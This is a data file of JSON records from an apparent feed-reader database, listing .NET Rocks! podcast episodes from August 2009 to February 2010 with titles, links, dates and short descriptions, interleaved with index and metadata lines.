{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=526","title":"NASA Pathfinder Innovation Challenge","published":{"$wrap":"$date","v":1266465600000,"h":"2010-02-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Michelle Viotti and Dr. Jeff Norris from NASA along with Marc Mercuri from Microsoft talk to Carl and Richard about their joint project, the Pathfinder Innovation Challenge in which .NET developers can help NASA make sense of the mountains of data coming back from Mars.","author":false,"_id":{"$wrap":"$oid","v":366}}
{"k":"0000000082","o":"0000000401","v":"001"}
{"_id":367,"_uid":367,"_dt":1373728934009,"_s":"3294b9b242224c5fcac5a899a301b6a5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=525","title":"Stephen Toub on .NET 4.0 Concurrency Features","published":{"$wrap":"$date","v":1266292800000,"h":"2010-02-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Stephen Toub talks to the boys about the new concurrency features in .NET 4.0.","author":false,"_id":{"$wrap":"$oid","v":367}}
{"k":"0000000082","o":"0000000421","v":"001"}
{"_id":368,"_uid":368,"_dt":1373728934009,"_s":"12cba8632cb2f085aab430826808588e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=524","title":"Bret Piatt and Josh Odom RackSpace Clouds","published":{"$wrap":"$date","v":1265860800000,"h":"2010-02-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Bret Piatt and Josh Odom from Rackspace talk about their company's offerings for hosting in the cloud.","author":false,"_id":{"$wrap":"$oid","v":368}}
{"k":"0000000082","o":"0000000505","v":"001"}
{"_id":369,"_uid":369,"_dt":1373728934010,"_s":"451fc9cc6c81d780cb1092b66fb7a70e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=523","title":"Ron Jacobs on Azure AppFabric","published":{"$wrap":"$date","v":1265688000000,"h":"2010-02-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Ron Jacobs talks to Carl and Richard about the Windows Azure platform AppFabric, which provides secure connectivity as a service to help developers bridge cloud, on-premises, and hosted deployments.","author":false,"_id":{"$wrap":"$oid","v":369}}
{"k":"0000000082","o":"0000000534","v":"001"}
{"_id":370,"_uid":370,"_dt":1373728934011,"_s":"eaafc8223ae6fe28f38729da88f7d31c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=522","title":"Walling and Taber on Micropreneur Academy.","published":{"$wrap":"$date","v":1265256000000,"h":"2010-02-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Rob Walling and Mike Taber talk about the Micropeneur Academy, a web-based community with the mission to assist one-man tech companies in reaching their goals. Membership is not free, but it's not expensive either.","author":false,"_id":{"$wrap":"$oid","v":370}}
{"k":"0000000082","o":"0000000469","v":"001"}
{"_id":371,"_uid":371,"_dt":1373728934011,"_s":"85962e7dcbc61c9e4e824a424d81eb1b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=521","title":"Kent Brown and Ed Pinto on WCF 4.0","published":{"$wrap":"$date","v":1265083200000,"h":"2010-02-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Richard and Carl talk to Kent Brown and Ed Pinto about the new features of WCF (Windows Communication Foundation) 4.0, which will be released April 12, 2010.","author":false,"_id":{"$wrap":"$oid","v":371}}
{"k":"0000000082","o":"0000000494","v":"001"}
{"_id":372,"_uid":372,"_dt":1373728934012,"_s":"b2ffc7b9950005eb722ce91aff394f99"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=520","title":"Catching up with Juval Löwy","published":{"$wrap":"$date","v":1264651200000,"h":"2010-01-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Juval is back to talk to Carl and Richard. They get to the bottom of his \"Every Object Should be a WCF Service\" argument, and get his insights into the current state of .NET development.","author":false,"_id":{"$wrap":"$oid","v":372}}
{"k":"0000000082","o":"0000000368","v":"001"}
{"_id":373,"_uid":373,"_dt":1373728934013,"_s":"27b838b5f490cf29b8d00508f713cab6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=519","title":"oData","published":{"$wrap":"$date","v":1264478400000,"h":"2010-01-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard get the word on oData from Brad Abrams, Bob Dimpsey and Lance Olson.","author":false,"_id":{"$wrap":"$oid","v":373}}
{"k":"0000000082","o":"0000000494","v":"001"}
{"_id":374,"_uid":374,"_dt":1373728934013,"_s":"33cd5e8437a76b7bc49ae71b03c05e64"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=518","title":"My .NET Story","published":{"$wrap":"$date","v":1264046400000,"h":"2010-01-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard pick the winner for the My .NET Story contest held by Microsoft. Contestants submitted their projects and were judged by a panel of experts. Includes short interviews with the finalists.","author":false,"_id":{"$wrap":"$oid","v":374}}
{"k":"0000000082","o":"0000000399","v":"001"}
{"_id":375,"_uid":375,"_dt":1373728934014,"_s":"96b38cf8aff000bf7994312b089c5724"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=517","title":"Jason Olson Digs into the CLR 4.0","published":{"$wrap":"$date","v":1263873600000,"h":"2010-01-19T04:00:00.000Z"},"starred":false,"read":false,"content":"What's new in the CLR? Jason Olson goes through some of the most important new features.","author":false,"_id":{"$wrap":"$oid","v":375}}
{"k":"0000000082","o":"0000000475","v":"001"}
{"_id":376,"_uid":376,"_dt":1373728934015,"_s":"2ffaff7a16fbcc36d2db4bc1cc18e8ee"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=516","title":"Ivar Jacobson on the Unified Process","published":{"$wrap":"$date","v":1263441600000,"h":"2010-01-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to the father of UML and the Unified Process, Ivar Jacobson. He recently put forth the Essential Unified Process (EssUp). Not to be missed.","author":false,"_id":{"$wrap":"$oid","v":376}}
{"k":"0000000082","o":"0000000416","v":"001"}
{"_id":377,"_uid":377,"_dt":1373728934015,"_s":"58c2651c91f5e1baad45016a01897b0e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=515","title":"Stephen Walther On ASP.NET AJAX 4.0","published":{"$wrap":"$date","v":1263268800000,"h":"2010-01-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Stephen Walther talks about the latest version (4) of ASP.NET AJAX and all the associated technologies.","author":false,"_id":{"$wrap":"$oid","v":377}}
{"k":"0000000082","o":"0000000398","v":"001"}
{"_id":378,"_uid":378,"_dt":1373728934016,"_s":"172de4c8b402247c8af390f035410ae4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=514","title":"Julie Lerman on Entity Framework 4.0","published":{"$wrap":"$date","v":1262836800000,"h":"2010-01-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Julie is back to talk about the improvements to the Entity Framework in version 4.0.","author":false,"_id":{"$wrap":"$oid","v":378}}
{"k":"0000000082","o":"0000000411","v":"001"}
{"_id":379,"_uid":379,"_dt":1373728934017,"_s":"06cb94db8c1d7f9116ebbc6cb7c4fd01"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=513","title":"Michael Learned on TFS Nuts and Bolts","published":{"$wrap":"$date","v":1262664000000,"h":"2010-01-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Michael Learned from Microsoft Premier Field Engineering dives deep into Team Foundation Server.","author":false,"_id":{"$wrap":"$oid","v":379}}
{"k":"0000000082","o":"0000000538","v":"001"}
{"_id":380,"_uid":380,"_dt":1373728934017,"_s":"1b7cfe93e8136c298305edc1545f0c22"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=512","title":"Huey and Wegner Migrate Us to SQL Azure","published":{"$wrap":"$date","v":1262232000000,"h":"2009-12-31T04:00:00.000Z"},"starred":false,"read":false,"content":"George Huey and Wade Wegner from Microsoft talk to Carl and Richard about George's creation, the SQL Azure Migration Wizard, a free tool that will save you countless hours when migrating SQL Server databases to SQL Azure.","author":false,"_id":{"$wrap":"$oid","v":380}}
{"k":"0000000082","o":"0000000414","v":"001"}
{"_id":381,"_uid":381,"_dt":1373728934018,"_s":"50832f1ae50d28c16a84b1d853b4115a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=511","title":"Scott Hunter Tours Us Through ASP.NET 4.0","published":{"$wrap":"$date","v":1262059200000,"h":"2009-12-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Scott Hunter to scratch the surface of the new features in ASP.NET 4.0","author":false,"_id":{"$wrap":"$oid","v":381}}
{"k":"0000000082","o":"0000000518","v":"001"}
{"_id":382,"_uid":382,"_dt":1373728934019,"_s":"22a90385fb04e1d0490ee02e0872966c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=510","title":"Scott Stanfield: Silverlight Rock Star!","published":{"$wrap":"$date","v":1261627200000,"h":"2009-12-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott Stanfield talks about how his company Vertigo developes Silverlight streaming video controller/viewer solutions forthe likes of Monday Night Football and The Olympics. Maybe you've heard of them?","author":false,"_id":{"$wrap":"$oid","v":382}}
{"k":"0000000082","o":"0000000429","v":"001"}
{"_id":383,"_uid":383,"_dt":1373728934019,"_s":"474514aa67b05bd054cd5850fad34c65"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=509","title":"Eric Lawrence on Fiddler","published":{"$wrap":"$date","v":1261454400000,"h":"2009-12-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Eric Lawrence from Microsoft talks about Fiddler, a debugging proxy for HTTP traffic that you can use in your own applications.","author":false,"_id":{"$wrap":"$oid","v":383}}
{"k":"0000000082","o":"0000000440","v":"001"}
{"_id":384,"_uid":384,"_dt":1373728934020,"_s":"c2e754958e3a18ff68c0bd7574343d21"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=508","title":"Corey Haines on Software Craftsmanship","published":{"$wrap":"$date","v":1261022400000,"h":"2009-12-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Corey Haines shares his ideas on the Software Craftsmanship movement: training, apprenticeship, guidance, and collaboration.","author":false,"_id":{"$wrap":"$oid","v":384}}
{"k":"0000000082","o":"0000000476","v":"001"}
{"_id":385,"_uid":385,"_dt":1373728934021,"_s":"14e6fdd5f58f023fdc3bcaea90fbaa19"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=507","title":"Michael Dirolf is SQL Free with MongoDB","published":{"$wrap":"$date","v":1260849600000,"h":"2009-12-15T04:00:00.000Z"},"starred":false,"read":false,"content":"MongoDB is a non-relational database. For most of us working with SQL Server, using a non-relational database is a strange idea. Michael Dirolf makes the case.","author":false,"_id":{"$wrap":"$oid","v":385}}
{"k":"0000000082","o":"0000000413","v":"001"}
{"_id":386,"_uid":386,"_dt":1373728934021,"_s":"7280f9ca2361cd3721f4ec1ab8c572e0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=506","title":"Live from Oredev 2009","published":{"$wrap":"$date","v":1260417600000,"h":"2009-12-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview today's luminaries live on stage at Oredev in Malmo, Sweden November 4th and 5th, 2009.","author":false,"_id":{"$wrap":"$oid","v":386}}
{"k":"0000000082","o":"0000000449","v":"001"}
{"_id":387,"_uid":387,"_dt":1373728934022,"_s":"c910e3a65123e8c87fb90fc988db2377"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=505","title":"Paul Litwin on SQL Reporting Services","published":{"$wrap":"$date","v":1260244800000,"h":"2009-12-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard caught up with Paul Litwin to talk about Reporting Services. Recorded live at DevConnections in Las Vegas last month.","author":false,"_id":{"$wrap":"$oid","v":387}}
{"k":"0000000082","o":"0000000508","v":"001"}
{"_id":388,"_uid":388,"_dt":1373728934022,"_s":"d5098af7e46b99105fdd9c23b3736041"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=504","title":"Codeplex Foundation","published":{"$wrap":"$date","v":1259812800000,"h":"2009-12-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Sam Ramji and Bill Staples about the Codeplex Foundation, which provides a framework to facilitate the participation of corporate software developers in open source projects communities.","author":false,"_id":{"$wrap":"$oid","v":388}}
{"k":"0000000082","o":"0000000434","v":"001"}
{"_id":389,"_uid":389,"_dt":1373728934023,"_s":"a7c2f4262e5a33964e1ebb2bedc606fb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=503","title":"Weyer and Baier on WIF","published":{"$wrap":"$date","v":1259640000000,"h":"2009-12-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Christian Weyer and Dominick Baier talk about real world Windows Identity Foundation. This show wraps up our three-part series on WIF.","author":false,"_id":{"$wrap":"$oid","v":389}}
{"k":"0000000082","o":"0000000532","v":"001"}
{"_id":390,"_uid":390,"_dt":1373728934024,"_s":"f103107369a5bb914b7137eb603ddd80"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=502","title":"Live from PDC, it's My .NET Story!","published":{"$wrap":"$date","v":1259208000000,"h":"2009-11-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview seven contestants in the My .NET Story contest. Enter a story about your .NET application online at www.mydotnetstory.com. The winner gets either a trip to the Galopagos Islands or a Smart Car.","author":false,"_id":{"$wrap":"$oid","v":390}}
{"k":"0000000082","o":"0000000458","v":"001"}
{"_id":391,"_uid":391,"_dt":1373728934025,"_s":"e8693ff222b131199fa5888346477289"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=501","title":"Bowen and Cummings on XNA","published":{"$wrap":"$date","v":1259035200000,"h":"2009-11-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Chris Bowen of Microsoft and Michael Cummings of Magenic on using XNA to develop games and applications for the PC, XBox and Zune.","author":false,"_id":{"$wrap":"$oid","v":391}}
{"k":"0000000082","o":"0000000466","v":"001"}
{"_id":392,"_uid":392,"_dt":1373728934026,"_s":"472930915dde073a19e30cebb203d0b6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=500","title":"It's The 500th Freakin Show!","published":{"$wrap":"$date","v":1258603200000,"h":"2009-11-19T04:00:00.000Z"},"starred":false,"read":false,"content":"I know! We can't believe it either. We went back over the last 100 shows and cherry picked a few of our favorite segments. Thank you for your continued support!","author":false,"_id":{"$wrap":"$oid","v":392}}
{"k":"0000000082","o":"0000000604","v":"001"}
{"_id":393,"_uid":393,"_dt":1373728934026,"_s":"80305a2c835bccd0951b830902150daf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=499","title":"Lev Novik on the Microsoft Sync Framework","published":{"$wrap":"$date","v":1258430400000,"h":"2009-11-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Lev Novik talks to Carl and Richard about the Sync Framework, a comprehensive synchronization platform that enables collaboration and offline access for applications, services, and devices with support for any data type, any data store, any transfer protocol, and any network topology.","author":false,"_id":{"$wrap":"$oid","v":393}}
{"k":"0000000082","o":"0000000516","v":"001"}
{"_id":394,"_uid":394,"_dt":1373728934027,"_s":"04ac4890f2bf1c21fd6c99d1741a1713"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=498","title":"Stephen Forte in The Netherlands","published":{"$wrap":"$date","v":1257998400000,"h":"2009-11-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard welcome Stephen Forte back to the show, this time in front of a small audience at SDC in Arnhem, The Netherlands.The discussion focuses on living as a developer in the modern digital world.","author":false,"_id":{"$wrap":"$oid","v":394}}
{"k":"0000000082","o":"0000000521","v":"001"}
{"_id":395,"_uid":395,"_dt":1373728934028,"_s":"28639d2f018989e4a4676b5c22b6c063"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=497","title":"Live from DevReach, Sofia, Bulgaria","published":{"$wrap":"$date","v":1257825600000,"h":"2009-11-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded in front of a live audience at DevReach Bulgaria, Carl and Richard talk to Christian Weyer, Shawn Wildermuth, and Hadi Hariri about Silverlight, Data Transports, and whatever else was on their minds.","author":false,"_id":{"$wrap":"$oid","v":395}}
{"k":"0000000082","o":"0000000657","v":"001"}
{"_id":396,"_uid":396,"_dt":1373728934030,"_s":"f9667319b2e5ef32f2575c17e8afd6dd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=496","title":"Dean Guo Takes Us Into Project Trident","published":{"$wrap":"$date","v":1257393600000,"h":"2009-11-05T04:00:00.000Z"},"starred":false,"read":false,"content":"The boys talk to Dean Gou about Project Trident, a scientific workflow workbench. With Project Trident, you can author workflows visually by using a catalog of existing activities and complete workflows. The workflow workbench provides a tiered library that hides the complexity of different workflow activities and services for ease of use.","author":false,"_id":{"$wrap":"$oid","v":396}}
{"k":"0000000082","o":"0000000417","v":"001"}
{"_id":397,"_uid":397,"_dt":1373728934031,"_s":"a6c47d5b1b3793c7708b451022f50953"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=495","title":"Vittorio Bertocci authenticates us with WIF","published":{"$wrap":"$date","v":1257220800000,"h":"2009-11-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Vittorio Bertocci goes over Windows Identity Foundation (Geneva) from a developer's perspective.","author":false,"_id":{"$wrap":"$oid","v":397}}
{"k":"0000000082","o":"0000000507","v":"001"}
{"_id":398,"_uid":398,"_dt":1373728934033,"_s":"82d2c13ed4e0781c2cb2277031a28100"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=494","title":"Chris Sells in on DataDude","published":{"$wrap":"$date","v":1256788800000,"h":"2009-10-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with Chris Sells at DevReach in Sofia, Bulgaria a couple weeks ago. Chris is all about Data Dude, the Visual Studio edition for Database Professionals. Great show on all counts.","author":false,"_id":{"$wrap":"$oid","v":398}}
{"k":"0000000082","o":"0000000414","v":"001"}
{"_id":399,"_uid":399,"_dt":1373728934034,"_s":"8597fd149721c7b3268a72ffc830d3e5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=493","title":"Doug Seven on Visual Studio 2010","published":{"$wrap":"$date","v":1256616000000,"h":"2009-10-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Doug Seven talks to the boys about Visual Studio 2010. In particular, pricing, features, and the launch.","author":false,"_id":{"$wrap":"$oid","v":399}}
{"k":"0000000082","o":"0000000400","v":"001"}
{"_id":400,"_uid":400,"_dt":1373728934035,"_s":"89b69e0b51fb4509b335260bfec5809f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=492","title":"Aaron Skonnard Builds a Real Cloud App","published":{"$wrap":"$date","v":1256184000000,"h":"2009-10-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Aaron Skonnard talks about his experiences building a real application in the cloud.","author":false,"_id":{"$wrap":"$oid","v":400}}
{"k":"0000000082","o":"0000000410","v":"001"}
{"_id":401,"_uid":401,"_dt":1373728934036,"_s":"20c0cc23c18532fd2890ae6ffe2e82c4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=491","title":"Francesco Balena on VB to .NET Migration","published":{"$wrap":"$date","v":1256011200000,"h":"2009-10-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Francesco Balena talks about his groundbreaking work in migrating VB6 applications to VB.NET","author":false,"_id":{"$wrap":"$oid","v":401}}
{"k":"0000000082","o":"0000000424","v":"001"}
{"_id":402,"_uid":402,"_dt":1373728934036,"_s":"b4d7af9f14487b49246e283c9daae3a0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=490","title":"Donald Farmer on Gemini","published":{"$wrap":"$date","v":1255579200000,"h":"2009-10-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Donald Farmer about Project Gemini, which brings Analysis Services to Excel in a very elegant way.","author":false,"_id":{"$wrap":"$oid","v":402}}
{"k":"0000000082","o":"0000000442","v":"001"}
{"_id":403,"_uid":403,"_dt":1373728934037,"_s":"642b5ff05ca2ade2a145abe8e656b2db"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=489","title":"Shawn Wildermuth on Declarative UI","published":{"$wrap":"$date","v":1255406400000,"h":"2009-10-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Shawn Wildermuth talks about the importance and significance of declarative User Interfaces in the context of WPF and Silverlight.","author":false,"_id":{"$wrap":"$oid","v":403}}
{"k":"0000000082","o":"0000000500","v":"001"}
{"_id":404,"_uid":404,"_dt":1373728934038,"_s":"be9904b4aaf85fbca379e6a69d97733c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=488","title":"Mark Miller and Billy Hollis on UI","published":{"$wrap":"$date","v":1254974400000,"h":"2009-10-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Miller and Billy Hollis go head to head on User Interface. The conversation ranges from WPF and Silverlight to Visual Studio and Blend to whatever else they felt like talking about...","author":false,"_id":{"$wrap":"$oid","v":404}}
{"k":"0000000082","o":"0000000503","v":"001"}
{"_id":405,"_uid":405,"_dt":1373728934038,"_s":"2f306b5cd4bfc81b18bff297035bbddc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=487","title":"Dana Groff and Yossi Levanoni Talk STM","published":{"$wrap":"$date","v":1254801600000,"h":"2009-10-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Software Transactional Memory (shipping as part of .NET 4.0) represents the next generation in writing code that utilizes multiple cores. The best part is, the code gets much more simple!","author":false,"_id":{"$wrap":"$oid","v":405}}
{"k":"0000000082","o":"0000000398","v":"001"}
{"_id":406,"_uid":406,"_dt":1373728934039,"_s":"faedc8ff0deb133f630fd433eac36f57"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=486","title":"Michelle Leroux Bustamante on Web Security","published":{"$wrap":"$date","v":1254369600000,"h":"2009-10-01T04:00:00.000Z"},"starred":false,"read":false,"content":"MLB is back to talk to Carl and Richard about the Claims-Based Security Model.","author":false,"_id":{"$wrap":"$oid","v":406}}
{"k":"0000000082","o":"0000000445","v":"001"}
{"_id":407,"_uid":407,"_dt":1373728934040,"_s":"65cbec395d05f208efb22b7b846f7327"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=485","title":"Steven Borg on All Things Team System","published":{"$wrap":"$date","v":1254196800000,"h":"2009-09-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Steven Borg talks about his experiences delivering solutions with Microsoft Team System, with a special focus on automated builds.","author":false,"_id":{"$wrap":"$oid","v":407}}
{"k":"0000000082","o":"0000000465","v":"001"}
{"_id":408,"_uid":408,"_dt":1373728934041,"_s":"fd18c3c25923984634cb00342971650a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=484","title":"Giving the Gift of Technology","published":{"$wrap":"$date","v":1253764800000,"h":"2009-09-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Philip Japikse talks about his experiences working on Hope Mongers, a volunteer-run asp.net-based website that brings charity projects together with donators.","author":false,"_id":{"$wrap":"$oid","v":408}}
{"k":"0000000082","o":"0000000430","v":"001"}
{"_id":409,"_uid":409,"_dt":1373728934042,"_s":"ae135a642a919f194b896cfa5c1a034f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=483","title":"Kent Tegels on SQL Server Integration Services","published":{"$wrap":"$date","v":1253592000000,"h":"2009-09-22T04:00:00.000Z"},"starred":false,"read":false,"content":"This conversation with Kent Tegels starts with SSIS and goes from there, like most good .NET Rocks! shows.","author":false,"_id":{"$wrap":"$oid","v":409}}
{"k":"0000000082","o":"0000000486","v":"001"}
{"_id":410,"_uid":410,"_dt":1373728934042,"_s":"7230e3ac8f15e5c44989aa769c9c9683"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=482","title":"Leon Gersing is Having a Love Affair with Ruby!","published":{"$wrap":"$date","v":1253160000000,"h":"2009-09-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Leon Gersing about his love affair with Ruby, which he so elequently spoke of as an audience member at DevLink in Nashville (show #476).","author":false,"_id":{"$wrap":"$oid","v":410}}
{"k":"0000000082","o":"0000000398","v":"001"}
{"_id":411,"_uid":411,"_dt":1373728934043,"_s":"20c542f76127d823b68cfe2bdb4a74c2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=481","title":"Martin Woodward on Team System","published":{"$wrap":"$date","v":1252987200000,"h":"2009-09-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Today's show is a previously recorded conversation with Martin Woodward about Team System.","author":false,"_id":{"$wrap":"$oid","v":411}}
{"k":"0000000082","o":"0000000487","v":"001"}
{"_id":412,"_uid":412,"_dt":1373728934044,"_s":"b858e07a78b78ff7c80494f34d181d44"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=480","title":"Microsoft battles HIV!","published":{"$wrap":"$date","v":1252555200000,"h":"2009-09-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jonathan Carlson, Bob Davidson, David Heckerman, and Carl Kadie from Microsoft Research about their efforts to find vaccines for HIV using Microsoft technologies.","author":false,"_id":{"$wrap":"$oid","v":412}}
{"k":"0000000082","o":"0000000400","v":"001"}
{"_id":413,"_uid":413,"_dt":1373728934045,"_s":"7e5337a793b1e7d1b2e610183444ee2e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=479","title":"Hall and McWherter Test ASP.NET!","published":{"$wrap":"$date","v":1252382400000,"h":"2009-09-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Ben Hall and Jeff McWherter talk with Carl and Richard about testing ASP.NET applications.","author":false,"_id":{"$wrap":"$oid","v":413}}
{"k":"0000000082","o":"0000000471","v":"001"}
{"_id":414,"_uid":414,"_dt":1373728934045,"_s":"e6102dfbdce76bc0a4d7b67d050eeffe"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=478","title":"John Petersen on the Legal Side of Software!","published":{"$wrap":"$date","v":1251950400000,"h":"2009-09-03T04:00:00.000Z"},"starred":false,"read":false,"content":"John Petersen talks about software patents, End User License Agreements, contracts, and other pains in the backside that we'd rather not think about.","author":false,"_id":{"$wrap":"$oid","v":414}}
{"k":"0000000082","o":"0000000417","v":"001"}
{"_id":415,"_uid":415,"_dt":1373728934046,"_s":"7f38659814132c936340c86d892bfc8b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=477","title":"Chris Menegay uses TFS for ALM!","published":{"$wrap":"$date","v":1251777600000,"h":"2009-09-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Chris Menegay is back to talk about using Team Foundation Server for ALM (Application Lifecycle Management).","author":false,"_id":{"$wrap":"$oid","v":415}}
{"k":"0000000082","o":"0000000562","v":"001"}
{"_id":416,"_uid":416,"_dt":1373728934047,"_s":"973aeb7b75df4664d4eb5765bd9c6115"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=476","title":"Panel: Is Software Development Too Complex?","published":{"$wrap":"$date","v":1251345600000,"h":"2009-08-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded live at devLink in Nashville, Tennessee. Billy Hollis, Kathleen Dollard, Jim Holmes, and Josh Holmes (no relation) discuss the issue of the complexity of software development. Several .NET celebrities in the audience also chimed in.","author":false,"_id":{"$wrap":"$oid","v":416}}
{"k":"0000000082","o":"0000000510","v":"001"}
{"_id":417,"_uid":417,"_dt":1373728934047,"_s":"609ad149f3dedd1c089afcd97410c1b6"}
